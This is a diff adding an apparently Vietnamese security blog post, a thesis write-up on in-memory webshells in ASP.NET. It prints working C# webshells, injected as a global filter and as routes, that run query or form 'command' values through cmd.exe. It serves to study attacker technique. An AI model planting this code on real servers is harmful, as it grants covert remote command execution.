@@ -1,0 +1,638 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Dưới sự hướng dẫn sát sao của người anh - người thầy Jang, mình đã bảo vệ thành công đồ án tốt nghiệp đề tài Memory Webshell trong .NET với kết quả khá tốt. Phè phưỡn 1 tháng không viết lách, mình nghĩ mình nên viết lại gì đó thay vì chỉ lưu trữ kiến thức trong quyển đồ án nộp cho nhà trường, vừa để củng cố kiến thức, vừa để tiện search lại sau này.\nĐây sẽ là bài viết trình bày những hiểu biết của mình trong quá trình học hỏi và nghiên cứu kỹ thuật Memshell trong ASP.NET, ảnh hưởng nặng nề từ yzddmr6 và endy.\n"><title>Memory Webshell in .NET Framework</title><link rel=canonical href=https://kev1n1203.github.io/p/memshell-dotnet/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="Memory Webshell in .NET Framework"><meta property='og:description' content="Dưới sự hướng dẫn sát sao của người anh - người thầy Jang, mình đã bảo vệ thành công đồ án tốt nghiệp đề tài Memory Webshell trong .NET với kết quả khá tốt. Phè phưỡn 1 tháng không viết lách, mình nghĩ mình nên viết lại gì đó thay vì chỉ lưu trữ kiến thức trong quyển đồ án nộp cho nhà trường, vừa để củng cố kiến thức, vừa để tiện search lại sau này.\nĐây sẽ là bài viết trình bày những hiểu biết của mình trong quá trình học hỏi và nghiên cứu kỹ thuật Memshell trong ASP.NET, ảnh hưởng nặng nề từ yzddmr6 và endy.\n"><meta property='og:url' content='https://kev1n1203.github.io/p/memshell-dotnet/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='dotNet'><meta property='article:published_time' content='2026-01-12T00:00:00+00:00'><meta property='article:modified_time' content='2026-01-12T00:00:00+00:00'><meta name=twitter:title content="Memory Webshell in .NET Framework"><meta name=twitter:description content="Dưới sự hướng dẫn sát sao của người anh - người thầy Jang, mình đã bảo vệ thành công đồ án tốt nghiệp đề tài Memory Webshell trong .NET với kết quả khá tốt. Phè phưỡn 1 tháng không viết lách, mình nghĩ mình nên viết lại gì đó thay vì chỉ lưu trữ kiến thức trong quyển đồ án nộp cho nhà trường, vừa để củng cố kiến thức, vừa để tiện search lại sau này.\nĐây sẽ là bài viết trình bày những hiểu biết của mình trong quá trình học hỏi và nghiên cứu kỹ thuật Memshell trong ASP.NET, ảnh hưởng nặng nề từ yzddmr6 và endy.\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#http-life-cycle>HTTP Life Cycle</a></li><li><a href=#filter-memory-webshell>Filter Memory Webshell</a><ol><li><a href=#filter-in-net>Filter in .NET</a></li><li><a href=#filter-comparison>Filter Comparison</a></li><li><a href=#deploy>Deploy</a></li></ol></li><li><a href=#route-memory-webshell>Route Memory Webshell</a><ol><li><a href=#logic-add-route>Logic Add Route</a></li><li><a href=#tự-implement-routebase>Tự Implement RouteBase:</a></li><li><a href=#sử-dụng-systemwebroutingroute>Sử dụng System.Web.Routing.Route</a></li></ol></li><li><a href=#httplistener-memory-webshell>HTTPListener Memory Webshell</a><ol><li><a href=#phân-tích>Phân tích</a></li><li><a href=#deploy-1>Deploy</a></li><li><a href=#giới-hạn>Giới Hạn</a></li></ol></li><li><a href=#virtualpath-memory-webshell>VirtualPath Memory Webshell</a><ol><li><a href=#not-so-memshell>Not so memshell</a></li><li><a href=#virtualpath-at-its-finest>VirtualPath at its finest</a></li></ol></li><li><a href=#httpmodule-memory-webshell>HTTPModule Memory Webshell</a><ol><li><a href=#httpapplication-reuse-mechanism>HttpApplication Reuse Mechanism</a></li><li><a href=#logic-add-eventhandler-into-httpmodule>Logic Add EventHandler into HttpModule</a></li><li><a href=#deploy-2>Deploy</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/memshell-dotnet/>Memory Webshell in .NET Framework</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-01-12T00:00:00Z>Jan 12, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>25 minute read</time></div></footer></div></header><section class=article-content><p>Dưới sự hướng dẫn sát sao của người anh - người thầy <a class=link href=https://medium.com/@testbnull target=_blank rel=noopener>Jang</a>, mình đã bảo vệ thành công đồ án tốt nghiệp đề tài Memory Webshell trong .NET với kết quả khá tốt. Phè phưỡn 1 tháng không viết lách, mình nghĩ mình nên viết lại gì đó thay vì chỉ lưu trữ kiến thức trong quyển đồ án nộp cho nhà trường, vừa để củng cố kiến thức, vừa để tiện search lại sau này.<br>Đây sẽ là bài viết trình bày những hiểu biết của mình trong quá trình học hỏi và nghiên cứu kỹ thuật Memshell trong <code>ASP.NET</code>, ảnh hưởng nặng nề từ <a class=link href=https://yzddmr6.com/ target=_blank rel=noopener>yzddmr6</a> và <a class=link href=https://endy.gitbook.io/endys-notes target=_blank rel=noopener>endy</a>.</p><h2 id=http-life-cycle>HTTP Life Cycle</h2><p>Trong môi trường .NET Framework, webapp sẽ được deploy dưới web server là IIS (Internet Information Services) và thường code theo 2 dạng: WebForms và WebMVC. Tất cả các request dù được code theo kiểu nào đều sẽ đi qua một chuỗi các sự kiện chuyên biệt để xử lý yêu cầu đến trong ASP.NET, gọi là HTTP Pipeline. Mô hình của HTTP pipeline có thể được mô tả như sau:<br><img src=https://hackmd.io/_uploads/rJMJibiHZx.png loading=lazy alt=image><br>Quá trình này đi qua một số bước:</p><ul><li>Nhận HTTP request từ người dùng, IIS sử dụng native dll Aspnet_isapi.dll để bắt đầu quá trình xử lý, đưa request vào một instance của class HttpRuntime.</li><li>HttpRuntime class gọi đến HttpApllicationFactory yêu cầu cấp instance HttpApplication để xử lý request, khởi tạo pipeline, mỗi instance chứa các HttpModule - nơi kiểm tra và thay đổi nội dung của HTTP request thông qua sự kiện có thứ tự nhất định. Request được duyệt qua nhiều sự kiện, gọi đây là HTTP Pipeline</li><li>Khi gọi đến sự kiện PreRequestHandlerExecute, IIS sẽ chọn ra HttpHandler tương ứng để xử lý thực tế và render phản hồi về cho client. Ví dụ như MvcHandler trong Web MVC và PageRouteHandler trong Web Forms.</li><li>HTTP Pipeline sử dụng object HttpContext để biểu thị cho HTTP request hiện tại, object này được truyền vào khi khởi tạo HttpApplication, đi qua quá trình xử lý của HttpModule cũng như được đưa xuống HttpHandler tại method ProcessRequest.</li></ul><p>Việc deploy memshell sẽ sử dụng các component có khả năng xử lý và kiểm soát HTTP Request/Response trong pipeline, nên đây là những kiến thức nền tảng cần phải biết trước khi tìm hiểu đến memshell.</p><h2 id=filter-memory-webshell>Filter Memory Webshell</h2><p>Sau khi chọn được MVCHandler để xử lý request, mô hình ASP.NET MVC sẽ đi qua class Controller - có nhiệm vụ chọn ra ActionMethod đúng để thực thi request và trả kết quả về cho client. Nhưng trước đó thì MVC cung cấp cho người dùng cơ chế Filter – có chức năng &ldquo;filter&rdquo; các request tương tự như class Filter của Java Tomcat, có khả năng thêm code xử lý logic, log lỗi, kiểm tra xác thực trước khi request đến bước Action Method.<br><img src=https://hackmd.io/_uploads/rJsG0-sHWl.png loading=lazy alt=image><br>Tính năng này nằm trong MVC Middleware chỉ thuộc ASP.NET MVC, nên để triển khai được thì webapps cần được code theo kiểu MVC</p><h3 id=filter-in-net>Filter in .NET</h3><p>Khi tạo 1 project web MVC sẽ xuất hiện 3 thư mục Models – Views – Controllers, ngoài ra tồn tại một số thư mục mặc định khác với các chức năng chủ yếu để lưu trữ như App_Data, Content, Scripts,&mldr; Đặc biệt chú ý đến file Global.asax, file này sẽ được gọi 1 lần khi ứng dụng web bắt đầu khởi chạy, chứa các thành phần cơ bản cần phải được khai báo để start up web service, đó là các filters, routes và bundles:<br><img src=https://hackmd.io/_uploads/rJ7jbfiHWl.png loading=lazy alt=image><br>Tại file FilterConfig.cs nằm trong App_Start chứa câu lệnh thêm filter tự định nghĩa vào GlobalFilterCollection, mặc định có filter HandleErrorAttribute để xử lý lỗi<br><img src=https://hackmd.io/_uploads/ByByzMjr-x.png loading=lazy alt=image><br>Các filter thực chất sẽ được thêm tại class GlobalFilterCollection thuộc namespace System.Web.Mvc:<br><img src=https://hackmd.io/_uploads/BkHWzzorWg.png loading=lazy alt=image><br>Về cơ bản, quá trình Add sẽ diễn ra như sau:</p><ul><li>Tạo một <code>List&lt;Filter></code> để lưu trữ Filter dưới dạng list, lưu tại thuộc tính <code>_filters</code></li><li>Kiểm tra Filter được thêm vào tại method ValidateFilterInstance, nếu không thỏa mãn sẽ trả về lỗi</li><li>Thêm Filter vào List khai báo trước đó, nếu Filter không đi kèm giá trị order sẽ tạo order với kiểu dữ liệu integer và giá trị mặc định là null</li></ul><p>Method ValidateFilterInstance được gọi để xem filter có implement các interface của một filter hợp lệ hay không:<br><img src=https://hackmd.io/_uploads/BymLzzirbl.png loading=lazy alt=image><br>Các filter hợp lệ gồm có:</p><ul><li>Authorization filters: phục vụ xác thực và ủy quyền trước khi bước vào các action của controller</li><li>Action filters: chứa logic mà được thực thi trước và sau khi thực thi Controller</li><li>Result filters: thực thi trước và sau khi render View</li><li>Exception filters: log, handle và catch các exception xảy ra trong quá trình Controller hoặc View chạy</li></ul><p>Trong số các filter này thì Authorization filters được gọi đầu tiên. Mình sẽ ưu tiên chọn những filter sớm nhất để inject</p><h3 id=filter-comparison>Filter Comparison</h3><p>Khi tồn tại 2 filters implements cùng một interface, thứ tự thực thi sẽ được xác định thông qua 2 tham số: Order và Scope<br><img src=https://hackmd.io/_uploads/rJ3tMfirZx.png loading=lazy alt=image><br>Nếu chưa khai báo thì mặc định Order sẽ được gán là -1. Còn giá trị scope được biểu diễn như sau:<br><img src=https://hackmd.io/_uploads/SkaizMsSWx.png loading=lazy alt=image><br>Logic so sánh nằm tại class FilterComparer thuộc FilterProviderCollection:</p><ul><li>Giá trị Order càng nhỏ thì càng được ưu tiên thực thi</li><li>Khi giá trị Order bằng nhau sẽ xem xét đến giá trị Scope. Tương tự như Order, giá trị Scope càng nhỏ thì mức độ ưu tiên càng cao.<br><img src=https://hackmd.io/_uploads/rkypzfsS-e.png loading=lazy alt=image><br></li></ul><p>=> Chỉ cần set giá trị cho Filter.Order một số nguyên nhỏ hơn -1 là được.</p><h3 id=deploy>Deploy</h3><p>Vì class GlobalFilterCollection là public class nên mình có thể gọi đến mà không cần reflection, logic code sẽ như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class MalFilter : IAuthorizationFilter {
+</span></span><span class=line><span class=cl>    public void OnAuthorization(AuthorizationContext filterContext){
+</span></span><span class=line><span class=cl>        String cmd = filterContext.HttpContext.Request.QueryString[&#34;command&#34;]; 
+</span></span><span class=line><span class=cl>        if (cmd != null){
+</span></span><span class=line><span class=cl>            HttpResponseBase response = filterContext.HttpContext.Response;
+</span></span><span class=line><span class=cl>            Process p = new Process();
+</span></span><span class=line><span class=cl>            p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>            p.StartInfo.Arguments = &#34;/c&#34; + cmd; 
+</span></span><span class=line><span class=cl>            p.Start();
+</span></span><span class=line><span class=cl>            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+</span></span><span class=line><span class=cl>response.Write(System.Text.Encoding.Default.GetString(data));
+</span></span><span class=line><span class=cl>            response.End();
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>GlobalFilters.Filters.Add(new MalFilter(), -10);
+</span></span></code></pre></td></tr></table></div></div><p>Sau đó thì mình có thể exec command với các đường dẫn hợp lệ:<br><img src=https://hackmd.io/_uploads/SyzjVzoHZe.png loading=lazy alt=image><br>Mình nói là đường dẫn hợp lệ bởi vì filter này không được call nếu path không tồn tại, đây cũng là 1 lưu ý khi sử dụng loại memshell này:<br><img src=https://hackmd.io/_uploads/rJM04zoSbl.png loading=lazy alt=image></p><h2 id=route-memory-webshell>Route Memory Webshell</h2><p>Tiếp đến là kỹ thuật Route, lợi dụng cơ chế routing để xử lý, cơ chế này là một module hoạt động trong pipeline, được sử dụng để phục vụ xử lý URL khi có request đến.<br>Cụ thể hơn, khi application event PostResolveRequestCache được gọi trong request pipeline, ASP.NET Routing sẽ kiểm tra đường dẫn của request để chuyển cho HttpHandler phù hợp, rồi gửi lên framework layer cao hơn tiếp tục thực thi:<br><img src=https://hackmd.io/_uploads/rJR3Hzjr-l.png loading=lazy alt=image></p><h3 id=logic-add-route>Logic Add Route</h3><p>File RouteConfig.cs mặc định sử dụng method MapRoute để định nghĩa Route có trong ứng dụng web với tên là Default:<br><img src=https://hackmd.io/_uploads/BJw88zor-e.png loading=lazy alt=image><br>Đây là cách mà WebMVC sử dụng để thêm và định nghĩa route mới, đi sâu vào hàm MapRoute mình thấy thực chất nó đang khởi tạo thông tin Route từ dữ liệu truyền vào, còn hàm thực sự thêm Route vào RouteCollection nằm tại method Add thuộc namespace System.Web.Routing:<br><img src=https://hackmd.io/_uploads/B1jyDzsSbe.png loading=lazy alt=image><br>Method Add cần 2 tham số. Tham số name không quan trọng khi được sử dụng để xem đã có route nào có giá trị name này chưa. Còn tham số route được ép kiểu về RouteBase là quan trọng nhất. RouteBase là một abstract class, được class System.Web.Routing.Route implement mặc định.<br>Như vậy sẽ có ít nhất 2 cách để triển khai Route Memory Webshell, một là tự tạo class để implement RouteBase, hai là sử dụng System.Web.Routing.Route đã implement RouteBase sẵn.</p><h3 id=tự-implement-routebase>Tự Implement RouteBase:</h3><p>Vì là 1 abstract class nên mình cần override 2 method GetRouteData và GetVirtualPath có trong nó:<br><img src=https://hackmd.io/_uploads/By8ODGsS-l.png loading=lazy alt=image><br>Hai method nhận vào các tham số khác nhau nhưng đều có object context của current request nên đều có thể sử dụng được. Công dụng của chúng gần như ngược nhau:</p><ul><li>GetRouteData: Trả về các thông tin routing của request khi request match với route</li><li>GetVirtualPath: Lấy thông tin về route của request khi request match với value truyền vào</li></ul><p>Mình có script ngắn này để check xem method nào được thực hiện trước:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script runat=&#34;server&#34;&gt;
+</span></span><span class=line><span class=cl>    public class MyRouteBase : RouteBase{
+</span></span><span class=line><span class=cl>        public override RouteData GetRouteData(HttpContextBase httpContext){
+</span></span><span class=line><span class=cl>            Console.WriteLine(&#34;GetRouteData is called!!&#34;);
+</span></span><span class=line><span class=cl>            return null;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){
+</span></span><span class=line><span class=cl>            Console.WriteLine(&#34;GetVirtualPath is called!!&#34;);
+</span></span><span class=line><span class=cl>            return null;
+</span></span><span class=line><span class=cl>        }}
+</span></span><span class=line><span class=cl>&lt;/script&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Kết quả thì GetRouteData được gọi trước, mình sẽ dùng method này:<br><img src=https://hackmd.io/_uploads/rkg6PfoBWg.png loading=lazy alt=image><br>Khi debug vào chương trình thì với mỗi request, với mỗi RouteBase thì các method GetRouteData và GetVirtualPath đều được gọi lần lượt thông qua câu lệnh foreach:<br><img src=https://hackmd.io/_uploads/S1lyuzsHZg.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/r1VyOGjHZg.png loading=lazy alt=image><br>Để route của bản thân chèn vào được chạy đầu tiên trong vòng for thì đơn giản mình Insert vào vị trí đầu tiên là được:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RouteCollection routes = RouteTable.Routes;
+</span></span><span class=line><span class=cl>routes.Insert(0, new MyRouteBase());
+</span></span></code></pre></td></tr></table></div></div><p>Mình sẽ có code deploy route memshell như này:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class CustomRouteBase : RouteBase{
+</span></span><span class=line><span class=cl>    public override RouteData GetRouteData(HttpContextBase httpContext){
+</span></span><span class=line><span class=cl>       String cmd = httpContext.Request.QueryString[&#34;command&#34;]; 
+</span></span><span class=line><span class=cl>       if (cmd != null){
+</span></span><span class=line><span class=cl>          HttpResponseBase response = httpContext.Response;
+</span></span><span class=line><span class=cl>          Process p = new Process();
+</span></span><span class=line><span class=cl>          p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>          p.StartInfo.Arguments = &#34;/c&#34; + cmd;
+</span></span><span class=line><span class=cl>          p.Start();
+</span></span><span class=line><span class=cl>          byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+</span></span><span class=line><span class=cl>          response.Write(System.Text.Encoding.Default.GetString(data));
+</span></span><span class=line><span class=cl>          response.End();
+</span></span><span class=line><span class=cl>       }
+</span></span><span class=line><span class=cl>       return null;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values){
+</span></span><span class=line><span class=cl>       return null;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>RouteCollection routeCollection = RouteTable.Routes;
+</span></span><span class=line><span class=cl>routeCollection.Insert(0, new CustomRouteBase());
+</span></span></code></pre></td></tr></table></div></div><p>We got memshell in arbitrary route bois:<br><img src=https://hackmd.io/_uploads/rJRKOfjHWe.png loading=lazy alt=image></p><h3 id=sử-dụng-systemwebroutingroute>Sử dụng System.Web.Routing.Route</h3><p>Nếu như không muốn tự tạo class implement RouteBRase thì mình có thể sử dụng public class System.Web.Routing.Route:<br><img src=https://hackmd.io/_uploads/rJTEcMjSbl.png loading=lazy alt=image><br>Một Route hợp lệ thì cần truyền vào hai tham số:</p><ul><li>Url dùng để chứa giá trị đường dẫn cho route</li><li>RouteHandler để truyền vào handler cho route đó, với kiểu IRouteHandler</li></ul><p>Nhảy vào IRouteHandler interface, để implement được interface này, cần phải override method GetHttpHandler để xử lý HTTP Response trả về cho người dùng. Vừa hay khi method GetHttpHandler nhận đầu vào là RequestContext – một encapsulation object của current HTTP request, nên mình có thể xài nó để control request vào và response ra:<br><img src=https://hackmd.io/_uploads/S1macfjrWx.png loading=lazy alt=image><br>Sử dụng logic bên trên, mình cook thành đoạn code như này:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class CustomRoute : IRouteHandler {
+</span></span><span class=line><span class=cl>    public IHttpHandler GetHttpHandler(RequestContext requestContext){
+</span></span><span class=line><span class=cl>        String cmd = requestContext.HttpContext.Request.Form[&#34;command&#34;]; 
+</span></span><span class=line><span class=cl>        if (cmd != null){
+</span></span><span class=line><span class=cl>            HttpResponseBase response = requestContext.HttpContext.Response;
+</span></span><span class=line><span class=cl>            Process p = new Process();
+</span></span><span class=line><span class=cl>            p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>            p.StartInfo.Arguments = &#34;/c&#34; + cmd;
+</span></span><span class=line><span class=cl>            p.Start();
+</span></span><span class=line><span class=cl>            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
+</span></span><span class=line><span class=cl>response.Write(System.Text.Encoding.Default.GetString(data));
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        return null;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>RouteCollection routeCollection = RouteTable.Routes;
+</span></span><span class=line><span class=cl>Route customRoute = new Route(&#34;RouteMemshell&#34;, new CustomRoute());
+</span></span><span class=line><span class=cl>routeCollection.Insert(0, customRoute);
+</span></span></code></pre></td></tr></table></div></div><p>Nhưng mà khi gọi đến <code>/RouteMemshell</code> thì mình bị lỗi 500, lỗi này do CustomRoute tạo ra không trả về object có dạng IHttpHandler:<br><img src=https://hackmd.io/_uploads/BJHNjfjHZg.png loading=lazy alt=image><br>Cần sửa lại code xíu để lượm được output tại response. Cụ thể là method GetHttpHandler cần return object implement interface IHttpHandler thay vì chỉ exec command.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
